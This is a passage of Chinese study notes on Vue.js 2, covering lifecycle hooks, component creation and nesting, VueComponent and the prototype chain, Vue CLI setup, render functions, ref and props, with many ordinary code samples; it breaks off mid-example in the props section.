使用render函数进行渲染 更新流程创建vm.$el并保存的目的：Vue进行新旧DOM比较时，对于可以复用的节点，应该得有保存了的之前的节点，才能实现复用。 1console.log(this.$el instanceof HTMLElement); // true 在哪个生命周期钩子中页面和数据尚未保持同步？beforeUpdate 然后进行虚拟DOM重新渲染，新旧虚拟DOM对比 注意：不会递归，前后的n值相等，不算更新，但是如果换成this.n++，就会陷入递归中，所以千万小心在updated中改变数据的操作 销毁流程 ​ vm销毁会引起销毁它的子组件 解绑全部指令 解绑事件监听器 是否与官网描述相悖？ 官网的事件监听器指的是自定义事件，而不是原生DOM事件。对于点击事件，最终Vue会使用正常的DOM事件去给button进行绑定，一旦绑定完成，以后将无法撤销。vm被销毁不会引起点击事件失效，因为它属于原生DOM事件。 销毁后watch监听失效 销毁后，仍然可以访问数据： 易错易混： 此时对数据的修改不会触发页面更新 总结注意：beforeCreat/created不是指vm创建之前/创建完毕（因为此时的this是vm），指的是数据监测、数据代理创建之前/创建完毕。 需求：提供停止变换按钮 12345678910111213141516171819202122232425262728&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;miketaylorjuly123.cn&lt;/h2&gt; &lt;button @click=&quot;stop&quot;&gt; 停止变换&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 const vm = new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; opacity: 1 &#125;, mounted () &#123; this.timer = setInterval( () =&gt; &#123; if (this.opacity &lt;= 0) this.opacity = 1 this.opacity -= 0.01 &#125;, 10) &#125;, methods:&#123; stop () &#123; clearInterval(this.timer) &#125; &#125; &#125;)&lt;/script&gt; 但是这样的停止较为温柔，只是停掉了定时器，可以通过其他手段改变opacity。 点击按钮后，opacity改变引起页面变化，说明响应式还在。 暴力停止：使之无法改变页面标签透明度 注意：虽然销毁了vm，但是定时器没有关闭！ 所以，完美的代码应该是: 注意：关闭计时器的思路，特别适合vm被“他杀”的情况。 常用的生命周期钩子： mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】 beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】 关于销毁Vue实例： 销毁后借助Vue开发工具看不到任何信息 销毁后自定义事件会失效，但是原生DOM事件仍然有效！！！ 一般不会在beforeDestroy中操作数据，因为即便操作数据，再也不会触发更新流程了 第二章 Vue组件化编程2.1 对模块与组件的理解 HTML代码不是复用。 模块：向外提供特定功能的js程序，一般就是一个js文件 原因：js文件很多且很复杂 作用：复用js，简化js编写，提高js运行效率 组件：实现应用中局部功能代码(html\\css\\js)和资源(mp3\\mp4\\ttf\\……)的集合 原因：一个界面功能很复杂 作用：复用编码，简化项目编码，提高运行效率 模块化：当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用 组件化：当应用中的功能都是以多组件的方式来编写，那这个应用就是一个组件化应用 2.2 非单文件组件非单文件组件：一个文件中包含有n个组件(a.html) ❌ 单文件组件：一个文件中只包含有1个组件(a.vue) ✔ 创建组件 组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。 data配置项不要写成对象，应该使用函数写法，返回对象的独立拷贝。（参见data的两种写法） 原因：采用对象式，组件复用时，一个该组件修改了数据，会导致其他所有该组件数据发生变化 let test = &#123; a: 1, b: 2 &#125; const x1 =test const x2 =test 123456789101112 &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915165039344.png&quot; alt=&quot;image-20210915165039344&quot; style=&quot;zoom:80%;&quot; /&gt;* ```js function test()&#123; return &#123; a:1, b:2 &#125; &#125; const x1 = test() const x2 = test() &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915165320822.png&quot; alt=&quot;image-20210915165320822&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;school&gt;&lt;/school&gt; &lt;hr /&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 // 创建school组件 const school = Vue.extend(&#123; template: ` &lt;div&gt; &lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学校位置：&#123;&#123;schoolAddress&#125;&#125;&lt;/h2&gt; &lt;/div&gt;`, data() &#123; return &#123; schoolName: &#39;UESTC&#39;, schoolAddress: &#39;成都市成华区建设路一环路东一段&#39;, &#125; &#125; &#125;) // 创建student组件 const student = Vue.extend(&#123; template: ` &lt;div&gt; &lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学生年龄：&#123;&#123;studentAge&#125;&#125;&lt;/h2&gt; &lt;/div&gt;`, data() &#123; return &#123; studentName: &#39;张加林&#39;, studentAge: 20 &#125; &#125; &#125;) // 创建vm实例，注册组件（局部注册） new Vue(&#123; el: &#39;#root&#39;, components: &#123; school: school, // 组件名: 中转变量 student: student //可以简写 &#125; &#125;) &lt;/script&gt; 123456789101112131415161718 &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915170328213.png&quot; alt=&quot;image-20210915170328213&quot; style=&quot;zoom:80%;&quot; /&gt; 注册由于是对象，所以可以简写：`school: school` = &gt; `school`，因为它是对象键值对。#### 组件全局注册&lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915170931869.png&quot; alt=&quot;image-20210915170931869&quot; style=&quot;zoom:80%;&quot; /&gt;由于现在只是局部注册，所以`root2`中使用`student`标签是无效的。```js // 注册全局组件：Vue.component(组件名称, 中转量) Vue.component(&#x27;student&#x27;, student)new Vue(&#123; el: &#x27;#root2&#x27;&#125;) 总结 Vue中使用组件的三大步骤： 定义组件（创建组件） 注册组件 使用组件（写组件标签） 如何定义一个组件？ 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一模一样，但也有一些区别： el不要写，因为最终所有组件都要经过一个vm的管理，由vm中的el决定服务于哪个容器 data必须写成函数，因为要避免组件复用时，数据存在引用关系 备注：使用template可以配置组件结构 如何注册组件？ 局部注册：new Vue时传入components配置项 全局注册：Vue.component(&#39;组件名&#39;,组件) 编写组件标签 2.3 组件编写注意点推荐命名写法一： 推荐命名写法二（脚手架中使用）： 但是会报错，因为我们没有使用脚手架！ 总结 组件名： 一个单词组成： 写法一：首字母小写 写法二：首字母大写 ✔ 多个单词组成： 写法一：my-school(kebab-case) 写法二：MySchool(CamelCase)，但是需要脚手架支持 ✔ 注意： 组件名尽可能回避HTML标签中已有的元素名称，例如：h2、H2都不行！ 可以使用name配置项指定组件在开发者工具中呈现的名字（注意：只是开发者工具！！！） 第三方组件库，大型项目开发会用到 组件标签： 写法一：&lt;shcool&gt;&lt;/school&gt; 写法二：&lt;school /&gt; 不使用脚手架时，&lt;school/&gt;会导致后续组件不能渲染 上述问题使用脚手架即可 简写方式：const school = Vue.extend(options)可以简写为：const school = options 上述代码表面上没有调用Vue.extend，但是实际上调用了，加debugger断点即可判断！（为了方便Vue.extend一般不写） 2.4 组件嵌套123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;school&gt; &lt;/school&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 // 创建学生组件 const student = &#123; template: ` &lt;div&gt; &lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学生年龄：&#123;&#123;studentAge&#125;&#125;&lt;/h2&gt; &lt;/div&gt;`, data() &#123; return &#123; studentName: &#x27;张加林&#x27;, studentAge: 20 &#125; &#125; &#125; // 创建学校组件 const school = &#123; template: ` &lt;div&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; `, data() &#123; return &#123; name: &#x27;UESTC&#x27;, address: &#x27;成华区&#x27; &#125; &#125;, // 注册组件 components:&#123; student &#125; &#125; new Vue(&#123; el: &#x27;#root&#x27;, // 注册组件 components: &#123; school &#125; &#125;)&lt;/script&gt; 后续开发中会定义App组件，用于管理应用中所有的组件，“它是vm之下，所有组件之上”。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;app&gt;&lt;/app&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 // 创建学生组件 const student = &#123; template: ` &lt;div&gt; &lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学生年龄：&#123;&#123;studentAge&#125;&#125;&lt;/h2&gt; &lt;/div&gt;`, data() &#123; return &#123; studentName: &#x27;张加林&#x27;, studentAge: 20 &#125; &#125; &#125; // 创建学校组件 const school = &#123; template: ` &lt;div&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; `, data() &#123; return &#123; name: &#x27;UESTC&#x27;, address: &#x27;成华区&#x27; &#125; &#125;, // 注册组件 components: &#123; student &#125; &#125; //创建hello组件 const hello = &#123; template: ` &lt;div&gt; &lt;h2&gt;欢迎来到我的网站：&#123;&#123;mysite&#125;&#125;&lt;/h2&gt; &lt;/div&gt; `, data() &#123; return &#123; mysite: &#x27;miketaylorjuly123.cn&#x27;, &#125; &#125; &#125; // 创建app组件 const app = &#123; template: ` &lt;div&gt; &lt;school&gt;&lt;/school&gt; &lt;hello&gt;&lt;/hello&gt; &lt;/div&gt;`, components: &#123; hello, school &#125; &#125; new Vue(&#123; el: &#x27;#root&#x27;, // 注册组件 components: &#123; app &#125; &#125;)&lt;/script&gt; 2.5 VueComponent构造函数 添加断点degugger可以发现VueComponent被调用。 关于VueComponent： school组件本质上是一个名为VueComponent的构造函数，且不是程序定义的，是Vue.extend生成的。 我们只需要写&lt;school&gt;&lt;/school&gt;或者&lt;school/&gt;，Vue解析时会帮我们创建school组件的实例对象。 即：Vue帮我们执行的：new VueComponent(options) 注意 VueComponent此处被调用了两次，如果不写标签，那么就不会调用 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent!!! 但是注意：school的VueComponent和hello的VueComponent是不同的！ 验证一： 1console.log(school === hello) // false 验证二： 12school.a = 99console.log(school.a, hello.a) // 99, undefined 验证三： 12345678Vue.extend = function (extendOptions) &#123; /*……………………………………*/ var Sub = function VueComponent (options) &#123; this._init(options); &#125;; /*……………………………………*/ return Sub&#125;; 每一次调用Vue.extend，都返回了一个VueComponent，但是每一次的VueComponent都是现定义的，传入的options是不同的。 关于this指向： 组件配置中： data函数、methods函数、watch中的函数、computed中的函数，它们的this均是【VueComponent实例对象】 VueComponent（vc）实例对象和vm极其相似，例如都有数据代理 new Vue(options)配置中： data函数、methods函数、watch中的函数、computed中的函数，它们的this均是【Vue实例对象】 VueComponent的实例对象，以后简称vc（也可称为：组件实例对象） Vue的实例对象，以后简称vm $children和$parent 组件是可复用的Vue实例，vc有的配置vm都有，但是vm有的配置，vc不一定有。 2.6 一个重要的内置关系顺着Demo函数的显式原型属性可以访问到原型对象；顺着实例的隐式原型属性对象也可以访问到原型对象。 12345678910111213141516171819 &lt;script&gt; Vue.config.productionTip = false ;// 阻止VUE启动时生成生产提示 // 定义一个构造函数 function Demo()&#123; this.a = 1 this.b = 2 &#125; // 创建一个Demo实例对象 const d =new Demo() console.log(Demo.prototype) // 显式原型属性 console.log(d.__proto__) // 隐式原型属性 // 程序员通过显式原型属性操作原型对象，追加一个x属性值99 Demo.prototype.x = 99 console.log(d.__proto__.x) / d.xconsole.log(Demo.prototype === d.__proto__) // true &lt;/script&gt; 重要结论： 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype 为什么要有这个关系：让组件实例对象(vc)可以访问到原型上的属性和方法。 原型链！ 实例对象上有隐式原型属性__proto__，函数上才有显式原型属性prototype 注意：实例的隐式原型属性，永远指向自己缔造者的原型对象！ VueComponent原型对象的原型对象就是Vue的原型对象 测试：通过vm和vc都可以访问到添加到Vue原型对象上的x 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;school&gt;&lt;/school&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示 Vue.prototype.x = 99 // 创建学校组件 const school = Vue.extend(&#123; template: ` &lt;div&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;showX&quot;&gt;点击展示x&lt;/button&gt; &lt;/div&gt; `, data() &#123; return &#123; name: &#x27;UESTC&#x27;, address: &#x27;成华区&#x27; &#125; &#125;, methods:&#123; showX()&#123; console.log(this.x) &#125; &#125; &#125;) // 创建一个vm const vm = new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; msg: &#x27;miketaylorjuly123.cn&#x27; &#125;, components:&#123; school &#125; &#125;)&lt;/script&gt; 2.7 单文件组件导言：将.vue或.less文件交给浏览器，是无法直接运行的，需要加工为html/css/js前端三件套代码才能实现，浏览器才能识别。处理加工的方法： webpack：自己配置loader和插件，完成整个编译流程，搭建工作流 脚手架VUE CLI，已经打造的工作流 单文件组件结构： 使用插件： 非单文件组件的弊病：样式不能跟着组件走 ES6模块化知识：三种暴露方式 分别暴露 统一暴露 默认暴露 一般使用默认暴露，因为单文件组件只需要暴露一个组件，引入时： 1import xxx from xxxx 使用分别暴露、统一暴露，引入时： 1import &#123;xxx&#125; from xxxx 相对更加简便，代码化简后： 可以直接暴露配置对象： 加上组件命名 index.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习单文件组件语法&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;../../js/vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; App.vue 1234567891011121314151617181920&lt;template&gt; &lt;div&gt; &lt;School&#x2F;&gt; &lt;Student&gt;&lt;&#x2F;Student&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import School from &#39;.&#x2F;School&#39;import Student from &#39;.&#x2F;Student&#39;export default &#123; name: &#39;App&#39;, component: &#123; School, Student &#125;,&#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; main.js 1234567import App from &#x27;./App&#x27;new Vue(&#123; template: `&lt;App&gt;&lt;/App&gt;`, el: &#x27;#root&#x27;, components: &#123; App &#125;,&#125;) School.vue 123456789101112131415161718192021222324252627282930&lt;template&gt; &lt;!-- 组件的结构 --&gt; &lt;div&gt; &lt;h2 class&#x3D;&quot;name&quot;&gt;学校名称：&#123;&#123; schoolName &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2 class&#x3D;&quot;position&quot;&gt;学校位置：&#123;&#123; schoolAddress &#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 组件的交互相关代码（数据 方法 ……）export default &#123; name: &#39;School&#39;, &#x2F;&#x2F; 最好与文件名保持一致，不写的话注册组件可能随便起名 data() &#123; return &#123; schoolName: &#39;UESTC&#39;, schoolAddress: &#39;成都市成华区建设路一环路东一段&#39;, &#125; &#125;,&#125;&lt;&#x2F;script&gt;&lt;style lang&#x3D;&quot;&quot;&gt;&#x2F;* 组件的样式 *&#x2F;.position &#123; color: #8080ff;&#125;.name &#123; color: cyan;&#125;&lt;&#x2F;style&gt; Studet.vue 123456789101112131415161718192021222324&lt;template&gt; &lt;!-- 组件的结构 --&gt; &lt;div&gt; &lt;h2&gt;学生姓名：&#123;&#123; studentName &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学生年龄：&#123;&#123; studentAge &#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 组件的交互相关代码（数据 方法 ……）export default &#123; name: &#39;Student&#39;, &#x2F;&#x2F; 最好与文件名保持一致，不写的话注册组件可能随便起名 data() &#123; return &#123; studentName: &#39;张加林&#39;, studentAge: 20 &#125; &#125;,&#125;&lt;&#x2F;script&gt;&lt;style lang&#x3D;&quot;&quot;&gt;&#x2F;* 组件的样式 *&#x2F;&lt;&#x2F;style&gt; 但是需要脚手架才能运行 第三章 脚手架3.1 创建脚手架Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台） 目前脚手架最新的版本是：4.x（注意与Vue版本区别开） Vue的版本不一定要和脚手架版本对应，一般脚手架版本使用最新的即可，因为脚手架向下兼容低版本的Vue，但是不要这样：很新的Vue版本搭配很旧的脚手架版本 脚手架官网：Vue CLI (vuejs.org)：command line interface命令行接口工具 创建vue脚手架： 全局安装@vue/cli： 1npm install -g @vue/cli 一定要把npm地址配置成镜像： 12npm config set registryhttps://registry.npm.taobao.org 切换到你要创建项目的目录，然后使用命令创建项目 1vue create xxxx 项目取名尽可能回避主流库的名称 同局域网的人都可以使用访问。 1Ctrl + C停止项目 3.2 分析脚手架结构项目文件基本结构： 12345678910111213141516├── node_modules├── public│ ├── favicon.ico: 页签图标│ └── index.html: 主页面├── src│ ├── assets: 存放静态资源，例如logo图，音视频……│ │ └── logo.png│ │── component: 存放组件│ │ └── HelloWorld.vue│ │── App.vue: 汇总所有组件│ │── main.js: 入口文件├── .gitignore: git 版本管制忽略的配置├── babel.config.js: babel 的配置文件，ES6转ES5需要借助babel，详细参 考babel官网├── package.json: 应用包配置文件├── README.md: 应用描述文件├── package-lock.json：包版本控制文件 package.json serve：开发过程中，使用这个命令，配置服务器，并运行 build：项目开发完成，构建打包成标准三件套，以便浏览器上运行 lint：几乎不用，对项目中书写的.vue/js文件全都进行一次语法检查，一般最后才使用 package-lock.json 包版本控制管理文件 npm run serve 1234567891011121314151617181920212223242526272829303132333435 执行后，直接运行 `main.js` 打开终端：`Ctrl` + `~` 脚手架高级功能：热更新（Hot Module Replacement--HMR） 以后开发都是单页面应用* index.html ```html &lt;!DOCTYPE html&gt; &lt;html lang=&quot;&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面，但是vue不支持IE8及其以下版本 --&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;!-- 开启移动端的理想视口 --&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;!-- 图标：配置页签图标，不在使用./或者../，而是使用&lt;%= BASE_URL %&gt; --&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;!-- 配置网页的标题：将package.json中的name作为网站的标题，由webpackage中的插件实现 --&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- noscript：如果页面不支持js，那么标签内容将在页面展示，可以在浏览器中禁用js，就能达到测试目的 --&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt; &lt;/html&gt; ![image-20210916133026852](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916133026852.png) 3.3 render函数讲解： 1render: h =&gt; h(App) // 功能：将App组件放入容器中 说明不能用红框代码替换render : h =&gt; h(App)，因为当前使用的是运行时版本的Vue，没有模板解析器（即引入的是一个残缺的模板解析器），解决方案：要么把需要编译的模板交给render函数，要么使用包含编译器的版本。 解决方案一 专门控制es6模块化引入Vue时到底是哪一个Vue.js，这里的vue.runtime.esm.js是一个残缺/精简版（缺少模板解析器）的Vue。 验证： 控制台输出了66666，确实是调用了vue.runtime.esm.js，所以我们尝试引入完整版的vue以便解决问题： 修改后，页面加载显示正常。 解决方案二由于引入残缺版的vue，要想配置具体的内容，就不能再写template 这里可以使用render解决： 12345render(a)&#123; 函数内容; 返回值; // 返回值必须要有！ console.log(typeof a) // function&#125; render用于当引入残缺版的vue时，还想配置具体的内容，就得借助render函数（由vue调用）。 简写后： 1render: (h) =&gt; h(&#x27;h1&#x27;, &#x27;你好哇&#x27;) // 传参： html内置元素, 内容 当传入的参数是组件： 123render: (h) =&gt; h(App)// 错误写法：render: (h) =&gt; h(&#x27;App&#x27;)// 上述写法是创建一个html里的App元素，而不是渲染组件 使用裁剪版Vue的原因vue =&gt; vue核心 + vue模板解析器 vue.js模板解析器几乎占用了vue三分之一的体积，如果不开发精简版的vue，就会出现问题：项目完成后，最终webpack打包后一定包含vue库，那么就一定有模板解析器。开发时，模板解析器帮助我们翻译模板；但是最后借助webpack，已经能把.vue给翻译成.js文件，而且该解析的模板都解析完成，已经变成浏览器认识的三件套了，此时模板解析器就多余了，使用裁剪版可以让打包出来的文件体积变小。 esm：es代表ES6模块化，m代表模块；即：使用ES6进行模块化引入，使用该版本的vue 对于组件(.vue文件)标签中的template能够被解析： 而vm中没人解析，所以不能写template标签。 要在浏览器中运行一个精简版的vue，需要使用vue.runtime.js/vue.runtime.min.js 总结 不同版本的vue.js： vue.js是完整版的Vue，包含：核心功能 + 模板解析器 vue.runtime.xxx.js是运行时版本的js，只包含：核心功能，没有模板解析器 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收createElement函数去指定具体的内容。 3.4 修改默认配置Vue入口文件默认为main.js，修改名称后，Vue找不到入口文件，就会报错。 脚手架依托于Webpack，而webpack有配置文件webpack.config.js。为了防止配置文件被破坏，所以Vue脚手架中默认隐藏了所有webpack相关的配置文件。 12// 查看默认vue inspect &gt; output.js 报错，可能的解决方案：CSDN 注意：output.js只是输出一下，不是说更改后脚手架会跟着配置变化 可以更改的配置项参考：配置参考 | Vue CLI (vuejs.org) 上述二者没有任何关系，一个是往vue构造函数上的某一个属性里添加/修改/删除属性，用于调整vue库工作方式；vue.config.js是调整脚手架的工作模式的。 一个样例： 1234567891011121314151617181920212223module.exports = &#123; pages: &#123; index: &#123; // page 的入口 entry: &#x27;src/index/main.js&#x27;, // 模板来源 template: &#x27;public/index.html&#x27;, // 在 dist/index.html 的输出 filename: &#x27;index.html&#x27;, // 当使用 title 选项时， // template 中的 title 标签需要是 &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; title: &#x27;Index Page&#x27;, // 在这个页面中包含的块，默认情况下会包含 // 提取出来的通用 chunk 和 vendor chunk。 chunks: [&#x27;chunk-vendors&#x27;, &#x27;chunk-common&#x27;, &#x27;index&#x27;] &#125;, // 当使用只有入口的字符串格式时， // 模板会被推导为 `public/subpage.html` // 并且如果找不到的话，就回退到 `public/index.html`。 // 输出文件名会被推导为 `subpage.html`。 subpage: &#x27;src/subpage/main.js&#x27; &#125; &#125; 此处使用common.js暴露，Vue将vue.config.js输送给webpack，而webpack基于node.js，而node.js采用的模块化是common.js。 脚手架将写完的vue.config.js中所有的配置提取出来，和webpack中写好的配置进行一个合并。而不是直接给出核心配置文件，即使出了问题，删除了vue.config.js，还可以继续采用默认配置，而不会出现永久破坏性更改。 12345678module.exports = &#123; pages: &#123; index: &#123; // page 的入口 entry: &#x27;src/zhulan.js&#x27;, &#125;, &#125; &#125; 此时对于更改main.js名称的项目，运行不会报错 注意：修改vue.config,js后，要使之生效，应该要重启服务器 配置项为空是不行的： 报错： 默认启动了语法检查，在main.js中声明了一个变量，但是没有使用，项目会报错，无法启动： 语法检查：eslint、jslint、jshint 使用配置项关闭语法检查： 此时项目可以正常启动 总结 使用vue inspect &gt; output.js可以查看到脚手架默认的配置 使用vue.config.js可以对脚手架进行个性化定制，详情见VUE CLI官网 3.5 ref属性1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div&gt; &lt;h1 v-text&#x3D;&quot;msg&quot; ref&#x3D;&quot;title&quot;&gt;&lt;&#x2F;h1&gt; &lt;button @click&#x3D;&quot;showDOM&quot;&gt;点我输出上方的DOM元素&lt;&#x2F;button&gt; &lt;Student &#x2F;&gt; &lt;School&gt;&lt;&#x2F;School&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import School from &quot;.&#x2F;components&#x2F;School&quot;;import Student from &quot;.&#x2F;components&#x2F;Student&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student, School &#125;, data() &#123; return &#123; msg: &quot;你好呀,zhul&quot;, &#125;; &#125;, methods: &#123; showDOM() &#123; console.log(this); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; ref属性可以理解为id的替代品。 在组件标签上加ref属性： 此处输出的是组件实例对象： 如果给组件标签加上id属性： 总结 ref属性： 被用来给元素或子组件注册（id的替代者） 应用在html标签上获取的是真实的DOM元素，应用在组件标签上是组件实例对象(vc) 使用方式 打标识：&lt;h1 ref =&quot;xxx&quot;&gt;……&lt;/h1&gt;或&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt; 获取：this.$refs.xxx 3.6 props配置12345678910111213141516171819&lt;template&gt; &lt;div&gt; &lt;Student &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;Student &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;Student &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import Student from &quot;.&#x2F;components&#x2F;Student&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student &#125;,&#125;;&lt;&#x2F;script&gt; 不难发现，它们三个是独立的三个Vc，之间是互不影响的。 App.vue（付款方） 12345678910111213141516171819&lt;template&gt; &lt;div&gt; &lt;Student myname&#x3D;&quot;张加林&quot; myage&#x3D;&quot;20&quot; &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;Student myname&#x3D;&quot;李顺&quot; myage&#x3D;&quot;21&quot; &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;Student myname&#x3D;&quot;李嘉亮&quot; myage&#x3D;&quot;21&quot; &#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import Student from &quot;.&#x2F;components&#x2F;Student&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student &#125;,&#125;;&lt;&#x2F;script&gt; Student.vue（收款方） 123456789101112131415161718192021222324252627282930&lt;template&gt; &lt;div&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt; &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; myname &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; myage &#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt; &lt;script&gt;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; msg: &quot;你好呀,zhul&quot;, &#125;; &#125;, props: [&quot;myname&quot;, &quot;myage&quot;],&#125;;&lt;&#x2F;script&gt; &lt;style&gt;.age &#123; color: #8080ff;&#125;.name &#123; color: #2030ff; background-color: #999;&#125;&lt;&#x2F;style&gt; 需求：要求每个人的展示年龄比实际年龄大1岁。 一种错误的实现方式： 错误原因：props传入的是字符串类型。 props传入的参数最终会被保存在vc上： 在开发者工具上可以清楚的区分是外部传入的，还是由data项配置的： 一种可行的解决方案（不是最佳的）： 最佳解决方案： 解析：:代表使用v-bind，使用动态绑定，myage传值，myage的值是运行引号中JS表达式的结果，不加冒号无论如何传的都是字符串。 上述方法可以限制传入的数据类型，现在测试前面错误的传值方式： 注意：接收到的props是不允许更改的。 12345678&lt;button @click=&quot;updateAge&quot;&gt;尝试修改传入的年龄&lt;/button&gt;/******************************/methods: &#123; updateAge() &#123; this.age = 999; &#125; &#125; 虽然会报错，但是更改还是会起作用。 推荐的修改props的方法： props中的属性优先被接收，放在vc上，所以才能读取this.myname / this.age 总结配置项props： 功能：让组件接收外部传入的数据 传递数据： &lt;Demo name=&quot;xxxx&quot;/&gt; 1234567* 接收数据： * 第一种方式（只接收）： ```js props:[&#x27;name&#x27;] 第二种方式（限制类型）： 123props:&#123; name:Number&#125; 第三种方式（限制类型、限制必要性、指定默认值）： 1234567props:&#123; name:&#123; type: String, // 类型 required: true, //必要性 default: &#x27;张加林&#x27;, 